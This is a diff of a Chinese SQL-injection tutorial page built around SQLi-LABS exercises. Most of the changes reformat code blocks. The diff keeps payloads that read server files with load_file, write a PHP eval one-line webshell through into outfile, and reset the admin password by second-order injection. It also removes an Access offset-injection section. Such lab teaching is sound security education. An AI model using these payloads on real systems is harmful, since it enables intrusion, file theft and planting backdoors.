@@ -458,7 +458,7 @@ Sql注入，由于Web应用程序对用户输入数据的合法性没有判断�
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.3k
+                    5.9k
                 </div>
                 
 
@@ -843,36 +843,35 @@ http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_nam
 </ul>
 <p><strong>前提条件：</strong></p>
 <ul>
-<li><p>须有读取权限，且文件完全可读            （在本地环境搭建测试时,mysql全局变量的配置中secure_file_priv 的值不能是null：        </p>
-</li>
-<li><p>secure_file_priv = 空的时候 ，任意读写</p>
-<pre><code>                secure_file_priv = 某个路径的时候，只能在规定的那个路径下读写
-    
-                secure_file_priv = null 不能读写）
-</code></pre>
-</li>
+<li><p>须有读取权限，且文件完全可读            <!--在本地环境搭建测试时,mysql全局变量的配置中secure_file_priv 的值不能是null    --></p>
+   <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">secure_file_priv &#x3D; 空的时候 ，任意读写
+secure_file_priv &#x3D; 某个路径的时候，只能在规定的那个路径下读写
+secure_file_priv &#x3D; null 不能读写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
 <li><p>要知道读写<strong>绝对</strong>路径</p>
-<p> 以SQLi-LABS-less1为例：</p>
 </li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">以SQLi-LABS-less1为例：
 
-<pre><code>我们可以直接在显示位上注入我们的SQL命令。如：
-</code></pre>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&quot;绝对路径&quot;),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+
 
-<pre><code>绝对路径的获取方法：1、经验；2、根据一些报错信息中获取。
-</code></pre>
+我们可以直接在显示位上注入我们的SQL命令。如：
+
+http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,load_file(&quot;绝对路径&quot;),3 --+
+
+绝对路径的获取方法：1、经验；2、根据一些报错信息中获取。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><ul>
 <li><p>into outfile</p>
 <p>  以SQLi-LABS-less1为例：</p>
 </li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+
 
-<pre><code>我们可以利用into outfile将一句话木马写入到某个路径
-</code></pre>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&quot;&lt;?php@eval($_GET[&#39;test&#39;]);?&gt;&quot; into outfile &#39;绝对路径&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+#我们可以利用into outfile将一句话木马写入到某个路径
+
+http:&#x2F;&#x2F;ip&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,&quot;&lt;?php@eval($_GET[&#39;test&#39;]);?&gt;&quot; into outfile &#39;绝对路径&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
@@ -944,60 +943,17 @@ http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_nam
 <ul>
 <li>SQL语句是这样的</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
 <li>而实际执行的语句是这样的：</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;qweasd&#39; where username&#x3D;&#39;admin&#39;#&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='qweasd' where username='admin'#' and password='$curr_pass' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210204154402812.png" alt="在这里插入图片描述"></p>
 <ul>
 <li>当我们提交用户名 <code>admin&#39;#</code> 修改密码为 qweasd的时候，<code>#</code>把后面的都给注释了，所以就是修改了admin用户的密码为 qweasd。</li>
 </ul>
-<h2 id="9、Access偏移注入"><a href="#9、Access偏移注入" class="headerlink" title="9、Access偏移注入"></a>9、Access偏移注入</h2><p>（此种方法比较靠运气，可做了解）</p>
-<pre><code>适用于在Accesss数据库中已知表名，无法获取字段的SQL注入。
-
-流程：
-</code></pre>
-<ol>
-<li><pre><code>判断字段数 order by  
-</code></pre>
-</li>
-<li><pre><code>判断表名
-</code></pre>
-</li>
-</ol>
-<pre><code> 首先我们利用`*`代替字段长度，从最后一个字段6开始，逐步缩减字段数。如下所示
-
-    union select 1,2,3,4,5,6 from admin
-     
-    union select 1,2,3,4,5,* from admin
-     
-    union select 1,2,3,4,* from admin
-     
-    union select 1,2,3,* from admin
-     
-    ... ...
-
-   **当缩减到某一行时，随机暴出来某一列数据**（要记住爆出数据的字段数）
-
-    有这样一个计算公式计算公式
-     
-    若共有30个字段，在第22个字段暴出数据 
-     
-    30-21=9
-
-    **(admin为表名)**
-
-    union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* from admin
-     
-    union select 1,2,3,4,5,6,7,8,9,10,11,12,*a.id,b.id*,* from (admin as a inner join admin as b on a.id=b.id) 
-     
-    union select 1,2,3,*a.id,b.id,c.id*,* from( (admin as a inner join admin as b on a.id=b.id) inner join admin as c on                
-
-    a.id=c.id)若偏移失败可去掉斜体重新尝试。
-</code></pre>
 <h2 id="SQL注入过滤与绕过"><a href="#SQL注入过滤与绕过" class="headerlink" title="SQL注入过滤与绕过"></a>SQL注入过滤与绕过</h2><p>过滤，顾名思义，将一些敏感字符过滤掉，从而达到一个防止注入的目的。</p>
 <p>绕过，使用某种方法来绕过过滤的内容，从而达到继续注入的目的。</p>
 <p>此处介绍几种常见的绕过方式，这些方法不局限于SQL注入，在其它web安全漏洞进行绕过时也可作为思路进行发散。</p>
@@ -1542,7 +1498,7 @@ http:&#x2F;&#x2F;ip&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and (select count(table_nam
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">12.8k</span>
+                        class="white-color">12.9k</span>
             
             
             
